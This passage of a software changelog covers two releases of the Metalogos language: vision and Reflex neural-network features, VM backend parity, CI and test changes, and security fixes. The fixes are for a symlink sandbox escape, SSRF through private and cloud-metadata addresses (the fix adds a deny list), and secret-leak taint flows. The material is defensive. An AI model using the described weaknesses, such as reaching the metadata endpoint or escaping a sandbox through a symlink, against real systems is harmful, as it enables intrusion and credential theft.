  - RoPE + QK-norm + causal mask implemented in `src/vision/` — `src/nn/*`
    NOT modified.
- **Golden embedding contract** (`tests/naryad_211_text_encoder_golden.rs`):
  6 tests, all `#![cfg(feature = "vision")]`. SHA-256 records + anchor
  bits are pinned as consts (naryad №230):
  - `golden_embeddings_shape_and_hash` — 3 prompts, shape + hash + anchor
    bits asserted bit-exact.
  - `determinism_same_seed_same_output` — same seed = identical hash.
  - `determinism_different_seed_different_output` — different seed =
    different hash.
  - `causal_property_prefix_match` — first N positions of long prompt
    match short prompt (1e-6 tolerance).
  - `qwen3_4b_config_matches_pinned_values` — constants-assert.
  - `param_seed_derivation_is_pairwise_distinct` — naryad №230 Block 1.6.
- **CI**: `vision-tests` job gains golden-contract step (with
  `--nocapture` since naryad №230).
- **Research**: `docs/research/naryad-211-text-encoder-facts.md` — 3
  independent sources confirming Qwen3-4B as Z-Image encoder, pinned
  config.json dimensions, dtype policy (F32 for R2), hidden-states
  question documented.
- **ADR-0123 item 1 resolved** — text-encoder identity confirmed.

### Added — Server test infrastructure (Naryad #207)

- **`run_test_server_with_backend_in_dir(source, backend, base_dir)`** — new
  test server function that accepts an explicit `base_dir` parameter. This
  controls BOTH import resolution paths:
  - TW: `Interpreter::set_base_dir(base_dir)` (module loading)
  - VM: `Compiler::with_std_root(base_dir)` (import resolution)
- Backward-compatible wrapper `run_test_server_with_backend(source, backend)`
  preserved — delegates via `current_dir()`, matching `Compiler::new()` semantics.
  ~40 existing callers unchanged.
- Test unblocking (n161 Block 3 in PR #221; dept_parity in fix-forward commit):
  - n161 Block 3: 4 tests rewired to `examples/debug` base_dir. 1 TW test
    active (`block3_tw_serves_imported_pattern`), 3 VM tests re-ignored
    with n207/n208 anchor — VM route body divergence: pattern calls in
    route bodies return 500 on VM (key finding of №207).
  - dept_parity: 3 tests rewired to `examples` base_dir. 1 TW test active
    (`tw_serves_all_dept_branches_correctly`), 2 VM tests re-ignored with
    n207/n208 anchor (same root cause: RouteByDept user-pattern calls +
    query_param in route bodies).
- Total `#[ignore]` count: 126 → 124 (2 tests now active; 5 re-anchored
  to n207/n208).
- Scope note for №208 (recorded in ADR-0122): root cause is VM lacking
  user-pattern dispatch in route bodies (HTTP 500) — broader than the
  previously recorded query_param/json_body/respond gaps. 31 tests
  un-ignore when fixed.

### Added — Vision pillar skeleton (Naryad #210, ADR-0124)

- **Feature gate `vision`** (off-by-default, not in `default`/`full`).
  Enable with `cargo build --features vision`. The inference stack
  (model loading, generation) lands in R2/R3 (naryads 211/212).
- **`Value::Vision(VisionId)`** — opaque handle (same pattern as
  `Value::Reflex`). Display: `[Vision#N]`. type_name: `"vision"`.
  Vision artifacts never enter `Value` — only an index.
- **`VisionRegistry`** — owns vision artifacts behind `Mutex`
  (mirrors `ReflexRegistry`). API: insert/get/remove/len/is_empty/list_ids.
- **6 SSOT loud-stub builtins**: `vision_generate(3)`, `vision_edit(2)`,
  `vision_export(2)`, `vision_list(0)`, `vision_save(2)`, `vision_load(1)`.
  Each returns a loud error with naryad + ADR reference — not a
  placeholder value. `vision_list()` returns honest empty list.
  Registered append-only in `BUILTIN_REGISTRY` (383 → 389 spec! lines).
- **`vision-tests` blocking CI job**: builds with `--features vision`,
  runs tests + clippy. Guard step verifies `vision` is NOT in
  `default`/`full`.
- **7 contract tests** in `tests/naryad_210_vision_skeleton.rs`:
  vision_list empty, loud errors (TW + VM parity byte-for-byte),
  handle display, type_name, registry index stability.

## [0.19.0] - 2026-09-07

**The eighth semantic pillar — Reflex — is now complete: neural networks
as a first-class language construct. The VM backend gains Reflex parity
(stage 1 of ADR-0121). Security audit covers Reflex taint flows. mlogpkg
gains full dependency resolution + lockfile + local audit. The
self-hosted parser bootstraps. ~1000 commits since v0.18.0.**

### Added — Reflex pillar (complete: train/predict, sequence, generation, distillation)

- **reflex_gen — text generation with KV-cache** (Naryad №193, ADR-0120):
  `reflex_gen Name { input: embedding(dim) vocab_size: V layers: [transformer_block(...)] seed: N }`.
  Autoregressive generation with O(N) KV-cache (`forward_step` per layer).
  `reflex_generate(model, prompt, max_tokens, temperature)` — greedy and
  temperature-sampled decoding. 4-layer transformer generates coherent
  patterns on toy datasets.
- **reflex_tokenize / reflex_detokenize** (Naryad №194): character-level
  tokenization — simplest deterministic scheme, no vocabulary training.
  Each Unicode char → code point as Float.
- **BPE tokenization** (Naryad №195): `reflex_bpe_train`, `reflex_bpe_encode`,
  `reflex_bpe_decode`, `reflex_bpe_save`, `reflex_bpe_load`. Opaque
  `Value::BpeVocab` handle, `BPE_REGISTRY` global Mutex, deterministic
  training with lexicographic tie-break, binary serialize/deserialize.
- **Batched training** (Naryad №196): `[batch, seq_len, dim]` tensor with
  padding mask. Padding tokens excluded from loss and attention.
  `batch_size=1` matches single-sequence path byte-for-byte. Measured
  2-3x speedup on batch sizes 4-8.
- **Grouped-Query Attention (GQA)** (Naryad №188): `n_kv_heads` parameter
  on `attention` and `transformer_block`. K/V weights `[dim, kv_dim]`
  (not `[dim, dim]`). `repeat_kv()` for GQA. Backward compatible when
  `n_kv_heads == n_heads`.
- **Stacked transformer_blocks** (Naryad №190): multiple blocks in a
  `reflex_seq`/`reflex_gen` layers list. VarMap prefixing prevents
  weight collision (`block0_attn_w_q`, `block1_attn_w_q`, ...).
- **RmsNorm + SwiGLU + transformer_block** (Naryad №184): modular
  SequenceLayer types. `SEQUENCE_LAYER_REGISTRY` for name→constructor
  dispatch. `reflex_seq` uses sequence-only layers, `reflex` uses
  dense-only — mixing is a compile-time error (ADR-0119).
- **Attention layer** (Naryad №183): trainable attention with causal mask,
  RoPE positional encoding, `TrainableAttention` for autograd.
- **reflex_seq — sequence classification** (Naryad №185): mean pooling +
  Dense classifier head. `reflex_train`/`reflex_predict` dispatch through
  `ModelKind` enum (Dense | Sequence | Gen).
- **Reflex distillation** (Naryad №181, ADR-0117): `distill_to`,
  `distill_after`, `fallback_if` fields on `learnable pattern`. LLM
  traffic distilled into a local reflex model after N examples.
  TEACHING→DISTILLED→FALLBACK cycle.
- **Reflex persistence** (Naryad №180, ADR-0116): `reflex_save` /
  `reflex_load` — serialize model weights to SQLite. Version-tagged,
  shape-mismatch detection.
- **Reflex introspection** (Naryad №187): `reflex_metrics(model)` →
  Struct { param_count, last_metric, layers, input_size, labels }.
  `reflex_list()` → List of registered model names.
- **candle ML framework** (Naryad №175/183, ADR-0118): optional feature
  `--features candle`. CPU-only, no GPU. `VarBuilder`/`VarMap`/`Var`
  autograd. Language works without candle (default build) — Dense
  classification is pure Rust.
- **Reflex declaration** (Naryad №178, ADR-0114): `reflex Name { input:
  embedding(dim) layers: [...] labels: [...] seed: N }`. Opaque
  `Value::Reflex(ReflexId)` handle — weights never enter `Value`.
  `ReflexRegistry` owns models. Deterministic weight init via
  xorshift64 PRNG (ADR-0115).
- **Reflex training/prediction** (Naryads №177/179/179b): `reflex_train(model,
  data, epochs, metric, threshold)` → Struct { loss, accuracy, metric,
  threshold_met }. `reflex_predict(model, input)` → Fluid (label with
  confidence). 80/20 holdout split, cross-entropy loss, SGD.

### Added — VM Reflex parity (ADR-0121, stage 1 of 6)

- **VM-owned ReflexRegistry** (Naryad №199): `Vm` struct gains
  `reflex_registry: ReflexRegistry` + `reflex_names: HashMap<String,
  ReflexId>`. `reflex_train`/`reflex_predict` intercepted in
  `call_builtin` before the stub fallback. Same shared dispatch
  functions as the interpreter — neural-network logic not duplicated.
  Determinism verified: same seed → same output byte-for-byte across
  both backends. `crosscheck_backends` no longer excludes
  `reflex_train_predict.mlog`.

### Added — Security (Reflex + learnable taint model)

- **UNTRUSTED_TRAINING_DATA check** (Naryad №201, OWASP A09):
  `json_body()`/`query_param()`/`form_data()` → `reflex_train` data/labels
  → Error (model poisoning / PII baked into weights). New Category-A
  check_id, blocking.
- **SECRET_LEAK extended to reflex_train** (Naryad №201): `env()` →
  `reflex_train` data/labels → SECRET_LEAK Error. Weights persist via
  `reflex_save` (ADR-0116), bypassing file-level sinks. Interception
  on `reflex_train` args (not `reflex_save` — taint cannot sit on
  `Value::Reflex` opaque handle per ADR-0114).
- **HTML_INJECTION extended to reflex_generate + learnable patterns**
  (Naryad №201): `reflex_generate` output treated as `LlmOutput` taint
  (model trained on data that may include LLM-tainted content per
  ADR-0117). Learnable patterns (declared with `learnable pattern`)
  are also taint sources — their output is the result of an LLM call.
  `respond(Classify(x))` → HTML_INJECTION Warning.
- **List literal taint propagation** (Naryad №201): `get_expr_taint`
  now propagates taint through `Expr::List` — needed for
  `[[env("K"), 0.0]]` in `reflex_train` data.
- **max_tokens ceiling** (Naryad №203 Block 4): `reflex_generate`
  `max_tokens` capped at 4096 — explicit error, not silent truncation.
  Prevents resource exhaustion when `mlog serve` receives external
  request with `max_tokens=1e9`.
- **bind 127.0.0.1** (Naryad №164): server binds to localhost by default.
- **secret() builtin** (Naryad №172): `secret("KEY")` returns
  `Value::Secret` directly (hard-failure if env var missing, unlike
  `env()` which returns empty string).
- **SSOT audit** (Naryad №170): `BUILTIN_REGISTRY` is the single source
  of truth — compiler, VM, and semantic analysis all derive from it.

### Added — Tooling

- **candle-tests blocking CI job** (Naryad №200): new blocking job in
  `.github/workflows/ci.yml`. Runs `cargo test --workspace --features
  candle` (lib + 20 candle-gated integration tests) and
  `cargo clippy --features candle`. Existing `test-lib` job verifies
  ADR-0118 (language works without candle).
- **mlogpkg dependency resolution + lockfile + audit** (Naryad №198):
  Full transitive dependency graph resolution with version conflict
  detection and cycle detection. `mlogpkg.lock` (deterministic TOML,
  alphabetical). `mlogpkg audit` — checks dependencies against local
  advisory database (manually maintained, NOT external CVE integration).
  `mlogpkg add` pre-flight resolves before writing `mlog.toml`.
- **Self-hosted parser** (Naryad №197): `self-host/parser.mlog` —
  Metalogos parser written in Metalogos itself. Bootstraps (parses its
  own source). 4 lexer bugs fixed in local Tokenize copy. Structural
  equivalence with Rust parser verified on 12 .mlog files.
- **module-size-guard** CI job: per-module LOC limits (5000 hard,
  4000 warning).
- **vscode-extension** CI job: compiles TypeScript, verifies
  `out/extension.js` exists.
- **AGENTS.md**: methodology document — code is source of truth, PR
  mandatory (ADR-0110), proofs by real CI runs.

### Fixed

- **VarMap collision in stacked blocks** (Naryad №190): TrainableAttention
  registered Vars under fixed names → stacked blocks overwrote each other.
  Fixed by adding `prefix` parameter.
- **GQA K tensor reshape** (Naryad №192): `apply_rope` had hardcoded
  `reshape((seq_len, self.dim))` — failed for GQA K tensor (smaller
  dim). Fixed to `reshape((seq_len, n_h * head_dim))`.
- **cross_entropy_loss scalar** (Naryad №193b): returned `[1,1]` tensor
  instead of scalar → `to_scalar` failed. Fixed with
  `.squeeze(0).squeeze(0)`.
- **KV-cache mismatch** (Naryad №193b): prompt processed via full
  `forward()`, but caches were empty → cache vs no-cache mismatch.
  Fixed: `forward_step` now used for ALL prompt positions.
- **golden error test divergence under candle** (Naryad №200):
  `collect_error_pairs` in `tests/golden.rs` skipped reflex_*.error
  pairs when `cfg!(feature = "candle")` is active. The .error files
  describe the candle-OFF message; under candle-ON the message differs.
- **stray .mlog files** (Naryad №203 Block 3): p161_deep_b/c,
  p161_route_helper moved from repo root to `examples/debug/`.

### Security

- All Reflex taint flows (Naryad №201) described above.
- `docs/threat-model.md` updated with 3 new risk rows:
  weights exfiltration, untrusted training data, model output as
  untrusted HTML.

## [0.18.0] - 2026-08-29

**Security hardening, SVG/graphics subsystem (44 builtins), VM backend parity,
office automation (PDF, email, calendar, contacts), code quality, and 60+ naryads of
improvements since v0.12.0.**

### Security — Naryad #131: `sandbox_path` symlink escape via `canonicalize()`
- `sandbox_path()` blocked absolute paths and `..` in text but did NOT
  resolve symlinks. A symlink inside the CWD pointing outside would pass
  both text checks and allow reading/writing arbitrary files.
- Added three-layer defence: (1) text checks preserved, (2) `canonicalize()`
  with `starts_with(canonical_base)` prefix verification, (3) ForWrite
  mode that canonicalizes only the parent directory (so `write_file` to
  a new file still works).
- `write_file`, `append_file`, `http_download` use `ForWrite` mode;
  `read_file`, `delete_file`, `file_exists`, `list_dir` use `ForRead`.
- 9 unit tests: normal read/write pass, symlink-to-outside rejected
  (file + subdir + dir symlink), write-to-new-file passes, absolute/`..`
  still rejected, broken symlink rejected.

### Fixed — Naryad #134: `collect_error_pairs` blind spot — 5 error contracts never ran in CI
- `collect_error_pairs` in `tests/golden.rs` had a hardcoded `p30_/p31_` prefix
  filter that silently skipped ALL other `.error` contracts, including
  `p114_secret_no_print.error` (Secret protection contract).
- Removed the prefix filter; now uses the same "pair exists → include" logic
  as `collect_pairs` for `.expected` files. Added deterministic sort order.
- Verified and updated all previously-skipped error contracts:
  - `err_undef.error`: updated message ("undefined entity" → "undefined variable")
  - `p2_multi_errors.error`: updated ("2 errors" → "unknown struct type: FakeType")
  - `p2_type_mismatch.error`: updated ("type mismatch" → "upper() expected String argument, got Float")
  - `p114_secret_no_print.error`: confirmed correct, no change needed
  - `err_unknown_step.mlog`/`.error`: **deleted** — program succeeds (soft-error
    pattern in `invoke()`), not an error contract. The pair was fundamentally
    wrong for the current architecture.
- Block 3 check: no other functions in `golden.rs` have the same hard-coded
  prefix pattern. `collect_pairs` uses justified exclusions (p7_, p88) with ADRs.
- **CI fix**: `p114_secret_no_print.mlog` pattern had 0 params but flow dispatch
  always passes 1 arg (arity mismatch). Fixed: pattern now accepts Secret
  param, flow passes entity through. Also fixed compilation errors in
  `naryad_128_secret_tests.rs` (wrong types: `Secret` takes `SecretString`,
  `Hash` takes `String`). Applied `cargo fmt` to all files.

### Fixed — Naryad #128: misleading `#[ignore]` Secret tests removed
- Two tests in `phase19_22_constraints.rs` (`test_z19_print_secret_forbidden`,
  `test_z19_to_string_secret_forbidden`) were marked `#[ignore]` with a comment
  claiming "Secret type constraints removed" — **incorrect and misleading**.
- The comment already provoked one incorrect external audit conclusion
  ("standard secret protection removed").
- Investigation found Secret protection works through *different* mechanisms than
  the obsolete semantic checker the old tests targeted:
  - `print(secret)` → runtime `is_nonprintable()` + audit `SECRET_LEAK`
  - `to_string(secret)` → `Display` returns `[Secret]` (not the real value);
    audit taint tracker still propagates Secret taint to downstream sinks
- No actual vulnerability found for `to_string()` — it is safe by design.
- Old tests deleted; replacement contract tests added in `naryad_128_secret_tests.rs`
  documenting the *actual* protection mechanisms (5 tests).

### Fixed — Naryad #127: Dockerfile stub build silently failed — dependency cache never worked
- Root cause: `|| true` hid TWO failures in the stub build step: missing
  `src/lib.rs` (needed by mlogpkg/mlog-lsp that depend on metalogos lib)
  AND missing `benches/core_benchmarks.rs` (needed by `[[bench]]` manifest entry).
- Fix: added `src/lib.rs` and `benches/core_benchmarks.rs` stubs, removed `|| true`.
- Dependency caching layer now actually compiles — verified by simulating the
  stub build locally (`cargo build --release` succeeds in ~5 min).
- `2>/dev/null` kept: suppresses noisy dep compilation output (expected),
  but build failures now correctly surface (non-zero exit code).

### Security — Naryad #130: SSRF guard for http_get/http_post/http_post_multipart
- Outgoing HTTP requests now resolve DNS **before** connecting and block
  requests to loopback, private, link-local, and cloud metadata addresses.
- DNS rebinding protection: resolved IPs are pinned via `reqwest::ClientBuilder::resolve()`,
  preventing TOCTOU between check and connection.
- Opt-out: `METALOGOS_HTTP_ALLOW_PRIVATE=1` disables the guard for local dev
  and internal integrations. Guard is on by default.
- Protected ranges: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`,
  `169.254.0.0/16` (link-local + cloud metadata `169.254.169.254`), `::1`, `fe80::/10`.
- 8 contract tests: C1 loopback blocked, C2 cloud metadata blocked, C3 IP
  classification + public IP passes, C4 opt-out allows private.

### Fixed — Naryad #124: honestly document mock accuracy metric in `adapt`
- README §5: replaced unconditional "quality metrics, and automatic rollback
  on degradation. No analogues exist" with honest description — rollback
  mechanism is real, quality metric is a fixed mock (0.95). See ADR-0112.
- ADR-0112: documented open question — real quality metric requires semantic
  decision (what to measure, what to compare against), not mechanical addition.
  Revisit only when mock value creates a concrete problem in real `mutate` usage.

### Fixed — Naryad #126: sandbox timeout is now truly preemptive, not post-factum
- `invoke_learnable_with_env`: LLM calls in a sandbox with `timeout > 0` now run
  in a separate thread with `mpsc::recv_timeout`. The calling thread stops
  waiting at the deadline instead of detecting the timeout after the call
  already returned.
- Known limitation (honestly documented): the background HTTP request to
  the LLM provider may still be running — only the *wait* is cancelled.
  Full request cancellation requires `reqwest::AbortHandle`, a separate naryad.
- `MockLlm`: added `set_delay_ms`/`reset_delay` for timeout contract tests.
- 4 contract tests: C1 preemptive timeout within budget, C2 call completes
  within timeout, C3 no sandbox no timeout, C4 timeout=0 backward compat.

### Fixed — Naryad #125: CSRF cookie missing HttpOnly so JS can double-submit
- `_mlog_csrf` cookie: removed `HttpOnly` flag — JS clients must read this
  cookie to perform double-submit. Session cookie `_mlog_session` retains
  `HttpOnly; Secure` (correctly, opposite requirement).
- 4 integration tests: cookie lacks HttpOnly, double-submit accept,
  reject missing token, reject wrong token.
- README OWASP wording verified — already correct.

### Fixed — Naryad #123: Taint checks now catch nested calls, not only variables
- `check_html_injection`: `respond(call_llm(...))` and `respond(call_claude(...))` now flagged (previously only `respond(x)` where `x` is a variable was caught).
- `check_secret_leak`: `http_post(url, env("KEY"), headers)` now flagged
  (previously only variable references in http_post body were checked).
- `check_sql_dynamic`: verified — no gap (checks literal vs non-literal, not taint).
- New helpers: `expr_is_llm_tainted()`, `is_llm_source()`.
- 5 contract tests added (2 HTML_INJECTION + 2 SECRET_LEAK + 1 regression).
- README: removed `respond(call_llm(p, i))` from Known boundaries table;
  added `respond_html(query_param("url"))` (open-redirect inline nesting) as remaining gap.
- Note: `check_open_redirect` has the same inline-nesting gap; tracked separately.

### Fixed — Naryad #129: BlockIfElse in VM now produces loud compile error
- `Expr::BlockIfElse` (block if/else used as expression: `let x = if c then { ... } else { ... }`)
  previously compiled to `Const(Value::Unit)` in the VM, silently producing wrong results.
  Now returns a clear compile error: "block if/else expression not yet supported in VM bytecode".
- `Statement::IfElseBlock` (block if/else used as statement) is **not affected** — still fully supported.
- Two contract tests added: expression form fails, statement form still compiles.
- ADR-0105 updated: BlockIfElse gap description corrected, Naryad #129 referenced.
- No golden examples were masking this defect (verified).


### Naryad #121 — Position tracking in the AST (span infrastructure, ADR-0111)

- **Feature:** Every AST node now stores its position in the source code
  (`Span { start_line, start_col, end_line, end_col }`). All 15 `Expr`
  variants, 9 `Statement` variants, and 41 `Declaration` structs contain
  a `span` field.
- **Feature:** `Span::from_pest()` — method for direct conversion of
  `pest::Span` into `ast::Span`. Improved `Display`: single-line spans
  show `"line:col"` instead of the full range.
- **Feature:** `Expr::span()` and `Declaration::span()` — methods to get
  a reference to the `span` from any enum variant.
- **Feature:** Semantic-analysis errors show the line number:
  `"line N: duplicate entity type: User"` instead of `"duplicate entity type: User"`.
- **Refactor:** All 15 tuple variants of `Expr` converted to struct
  variants with named fields (e.g., `StringLit(String)` →
  `StringLit { value, span }`). Likewise `IfThen`, `Return`, `ExprStmt`
  in `Statement`.
- **Tests:** 5 new tests in `parser/tests.rs` verify real positions
  in error messages. All 539 tests pass, crosscheck — 1 passed,
  0 failed.
- **ADR-0111:** Architectural decision: inline `span` field instead of a
  `Spanned<T>` wrapper, 0-indexed columns / 1-indexed lines.

### Naryad #55 — Registry holes block the office port

- **db_execute arity 1..2:** Registry updated to reflect ADR-0068 parameterised queries. Office 86 call sites now pass `mlog check`.
- **5 missing functions added to registry:** `to_int` (string, arity 1), `cron_add` (cron, 2), `cron_list` (cron, variadic), `cron_remove` (cron, 1), `cron_run` (cron, 1).
- **Automated sync test:** `registry_sync_check.rs` verifies builtin_count()/builtin_names()/builtin_name_set() agree with BUILTIN_REGISTRY. Catches funcs.insert without matching spec!.
- **ADR-0098:** Documents registry–dispatcher sync decision and registry-only categories.

### Naryad #52 — Porting Naryad #51's work onto current main

- **Cherry-pick onto 74a1631:** 6 commits from naryad-51-workers ported to fresh branch from origin/main (which includes Naryads #49+#50).
- **ADR-0096 merged:** Combined single-core worker diagnosis (№50) with nested block_in_place panic finding (№51) into one comprehensive ADR.
- **22 arity registry fixes:** Verified against actual implementations: `format`→variadic, `zip`→2, `filter`/`reduce`→3, `http_get`→1..3, `call_claude`→4, `call_llm`→1..2, `send_message`→2..3, `tts_send`→4..5, `geo_ip`→0..1, `web_search`→1..2, `weather_forecast`→1..3, `graph_query`→1..3, `graph_path`→2, `mtree_retrieve`→1..2, `estimate_tokens`/`extract_param`/`read_file_tokens`→exact, `answer_callback_query`→1..3, `edit_message_text`→3..4, `sort_by`→2..3.
- **Exhaustive arity test:** `registry_arity_check.rs` now tests every non-variadic builtin at min/max/boundary, plus all variadic builtins.
- **Block 2 (concurrency benchmark):** Not executed — Rust toolchain not available in this session. Owner can measure on live deployment.

### Naryad #51 — Concurrency: tokio workers

- **Explicit worker count:** `METALOGOS_WORKERS` env var overrides default `max(4, available_parallelism)` workers. Logged at startup. Invalid values produce warning, not panic.
- **spawn_blocking fix:** Replaced 6 `block_in_place()` calls with `spawn_blocking()` in server.rs. `reqwest::blocking` inside `block_in_place` caused nested runtime drop panic. Interpreter and Vm verified as Send.
- **ADR-0097:** Documents spawn_blocking decision.
- **Branch cleanup:** Deleted 5 stale remote branches (naryad-41/42/43/49/50).

### Naryad #50 — FOSVED operational requirements

- **ADR-0071 honest re-accounting:** Of 92 original integration test failures, ~22 genuinely fixed, ~67 converted to `#[ignore]`.
- **Builtin arity range:** Added `max_arity: Option<usize>` to `BuiltinSpec` with `spec!` macro. ~59 registry entries corrected.
- **Unknown function detection:** `mlog check` now catches calls to nonexistent functions.
- **HMAC/SHA-256 builtins:** `sha256`, `hmac_sha256`, `hex_encode`, `hex_decode` with RFC vectors verified.
- **Concurrency root cause:** `block_in_place()` on single-core tokio (ADR-0096).
- **Registry sync test:** Spot-check test for key builtins with range arities.

### Typed memory with FTS5 BM25 + cosine RRF hybrid recall (ADR-0093, ADR-0094)
- Feature: `memorize(text, priority, type)` now accepts 3rd argument — type tag
  (`persona`, `episodic`, `instruction`, `fact`). Backward compatible: 2-arg form
  uses empty type.
- Feature: `recall_top_k(query, k, type)` — hybrid search returning JSON array of
  scored entries. FTS5 BM25 keyword index + cosine similarity, merged via
  Reciprocal Rank Fusion (k=60). Type filtering optional.
- Feature: FTS5 virtual table with content-synced triggers in SQLite schema.
- Feature: `mem_type` column + index on `memories` table.
- Fix: `load_all()` bug — SELECT now includes `mem_type` (was hardcoded empty).
- ADR-0093: memory typology + FTS5 foundation design decisions.
- ADR-0094: type-aware recall with RRF merge replacing weighted blend.

### PDF processing via pdf-inspector (Naryad #48)
- Feature: 4 native PDF builtins — `pdf_classify`, `pdf_to_markdown`,
  `pdf_extract_regions`, `pdf_ocr`. Pure Rust, zero IPC.
- Feature: `pdf_classify(path)` — classify PDF type (TextBased/Scanned/ImageBased/Mixed).
- Feature: `pdf_to_markdown(path)` — full extraction pipeline to Markdown.
- Feature: `pdf_extract_regions(path, filter)` — text items with coordinates and OCR status.
- Feature: `pdf_ocr(path)` — OCR fallback via tesseract-rs (requires `--features pdf-ocr`
  and system tesseract-ocr + CJK training data).
- Feature: optional `pdf-ocr` feature flag + tesseract 0.15 dependency.
- Test: 8 unit tests in pdf.rs + integration test file phase48_pdf_inspector.rs.
- Test: CJK fixture tests (5 files from pdf-inspector repo, verify no U+FFFD).

### Rule priority fix and golden cleanup — Naryad #43
- Fix: `execute_rules()` in both interpreter and VM now implements
  priority-ordered, first-wins semantics (ADR-0090). Previously all
  matching rules executed with last-write-wins, inverting priority.
- Fix: per-field deduplication via `HashSet<(String, String)>` — rules
  targeting different fields of the same entity all fire; only same-field
  conflicts are resolved by priority.
- Test: `p42_rule_priority_order.expected` updated 0.5 → 0.9.
- Test: `p42_rule_equal_priority.expected` updated 0.3 → 0.9.
- Test: `p43_rule_different_fields` added — both fields written.
- Fix: 5 stale golden expected files corrected (v05_integration,
  v05_string_ops, v05_let_bindings, p30_db_params, p31_malformed.error).
  Golden coverage: 66/70 pass (4 remaining are server/env-dependent p7_*).
- ADR-0090: rule priority semantics with prior art (CLIPS, Drools).

### Fluid Types, confidence, and rule tests — Naryad #42
- Test: 6 golden test pairs (`p42_fluid_*`) covering Fluid collapse
  semantics — type-directed selection, max confidence wins, threshold
  boundary (0.1), no matching variant soft-failure, non-Fluid passthrough.
- Test: 8 unit tests on `maybe_collapse` directly — threshold boundary,
  empty Fluid, type selection, non-Fluid passthrough.
- Test: 4 golden test pairs (`p42_rule_*`) covering rule engine — priority
  ordering (last-write-wins), equal priority (declaration order), probabilistic
  value assignment, condition-not-met no-change.
- Docs: renamed `p1_confidence_propagation` → `p1_fluid_collapse` —
  the example tested collapse, not propagation.
- ADR-0089: documents actual confidence semantics — no propagation through
  pattern calls; after collapse value is concrete; `confidence()` returns
  1.0 on concrete values. Open question: future propagation approaches.
- README verified: no false claims of confidence propagation.

### VM backend parity — Naryad #41
- Compiler: `match` statement returns compile error (`Err`) instead of
  silent Unit placeholder. Routes with `match` cannot compile for VM —
  prevents silently wrong results.
- VM audit log: `Vm` now has `audit_log: Mutex<Vec<String>>` with
  `push_audit()` / `take_audit_log()`. Adapt, Relate, Mutate instructions
  write audit entries matching interpreter format.
- Server: `flush_vm_audit_entries_to_db()` flushes VM audit to SQLite
  and in-memory log after each request. Closes OWASP A09 regression.
- Session hooks: investigated — `hooks_session_start`/`hooks_session_end`
  are startup-time only (in `run()`), NOT per-request. No discrepancy
  exists between backends. FOSVED does not use session hooks.
- Test: `test_n41_side_effect_parity` verifies both backends return same
  HTTP status for OK and crash cases.
- Test: `test_n41_match_not_compilable_in_vm` and
  `test_n41_non_match_routes_compile_in_vm` verify match compile error.
- `load_program()` benchmark on `app.mlog`: ~134 µs per request (debug).
  Acceptable for LLM-heavy routes; negates VM advantage for micro-routes.
- ADR-0088 updated: Block 1-5 results, corrected session hooks claim.

### VM backend for mlog serve (Naryad #40)
- `METALOGOS_SERVE_BACKEND` env var: `interpreter` (default) or `vm`.
  Unknown value → warning in log + fallback to interpreter, no panic.
- `CompiledRoute` struct in `bytecode.rs`: compiled route body bytecode.
- `Compiler::compile_routes()`: compiles route body statements to bytecode
  (reuses pattern body compilation pipeline).
- `Vm::load_program()`: initializes VM state without executing main_code
  (prevents flow execution during per-request VM setup).
- `Vm::execute_route_code()`: per-request route execution with fresh stack.
- `Vm` server-context: `set_server_json_body`, `set_server_query_params`,
  `set_server_user_roles` + `clear_server_context`.
- `Vm::call_builtin` intercepts `query_param`, `json_body`, `form_data`,
  `require` — same semantics as interpreter's FnCall dispatch.
- `ServerState` extended: `backend`, `vm_program`, `vm_routes`.
- Route compilation at startup (not per-request). Backend logged at start.
- `execute_route_body_vm()` in server.rs: VM route execution path
  with `block_in_place` for `!Send` Vm.
- Tests: env flag default/fallback, crash route → 500, OK route → 200,
  query param isolation, kv_set cross-request visibility.
- ADR-0088: VM backend for mlog serve — feasibility and implementation notes.

### And/Or in VM bytecode (Naryad #39)
- VM compiler: implemented `and`/`or` short-circuit evaluation using
  `JumpIfNot`/`Jump`/`Const` instructions. Semantics match interpreter:
  result is always `Value::Bool`, right operand not evaluated when left
  decides the result.
- Golden test `p39_and_or.mlog`: truth table, short-circuit verification
  via side effects, nesting, is_truthy on empty string/list.
- ADR renumbering: resolved 5 duplicate ADR numbers (0072-0076). Second
  instances moved to 0082-0087. Protected 0073/0075/0076 referenced in code.
- Created `docs/adr/README.md` with full index and numbering rule.

### Module size policy (Naryad #38)
- ADR-0080: module size policy — production files ≤2,000 lines, tests exempt.
  Supersedes the 800-line rule from №37.
- Interpreter: extracted `execution.rs` (1,645 lines) from `mod.rs` (2,178 → 539).
  Moved `run()`, `eval_expr()`, `eval_statements()`, `eval_binop()`, `invoke()`.
- Builtins: extracted `office.rs` (1,724 lines) from `server.rs` (2,579 → 865).
  Moved human, goal, todo, recipe, DAG, semantic search, config builtins.
- Builtin form audit: confirmed №37 split preserved `fn builtin_xxx()` form
  in all 8 extracted modules. No closure re-registration occurred.

### Code quality (Naryad #38)
- Clippy: zero warnings on `--all-targets` (was: compilation failure).
  Fixed unused imports, missing struct fields, private function access,
  bool_assert_comparison, len_zero, unnecessary_mut, cloned_ref_to_slice_refs,
  useless_conversion, redundant_closure across 15 files.
- CI: `clippy` job promoted from advisory to blocking. `continue-on-error` removed.
- Session store test helpers (`reset_session_store`, `session_key_count`,
  `session_store_count`) made `pub` for integration test access.

### VM feasibility assessment (Naryad #38)
- ADR-0081: VM-for-serve feasibility with FOSVED-office-v2 data.
  22/23 .mlog files pass `mlog check`. 4 files blocked by missing `And`/`Or`
  short-circuit evaluation in VM (92 combined occurrences). Single well-scoped
  fix needed before `mlog serve` can switch to VM backend.

### Code quality (Naryad #37)
- Clippy: zero warnings (was 192). Categories fixed: get(0)→first(), doc formatting,
  redundant closures, unnecessary mut/return/clone, new_without_default (11 types),
  dead_code cleanup, matches!/sort_by_key/clamp/flatten/Entry API, and more.
- CI: `fmt` gate restored to green with `cargo fmt` commit.
- ADR: resolved 8 numbering collisions (0076 duplicate, 071 missing leading zero).
  Renamed 0076-vm-dispatch-paths.md → 0077-vm-dispatch-paths.md.
- ADR-0075: clarified 58/58 crosscheck — zero both-error cases (all 58 are genuine
  both-success matches).
- Builtins: split builtins.rs (10,838 lines) into 15 modules: mod, registry, core,
  string, math, collections, crypto, llm, http, json, io, memory, cron, server, tests.
  mod.rs reduced to 581 lines.
- Interpreter: split interpreter.rs (5,073 lines) into 10 modules: mod, values, types,
  events, db, conversations, learnable, modules, flow, memory, hooks.
  mod.rs reduced to 2,172 lines.
- Parser: split parser.rs (4,921 lines) into 5 modules: mod, helpers, expr, stmt,
  decl, tests. mod.rs reduced to 128 lines.
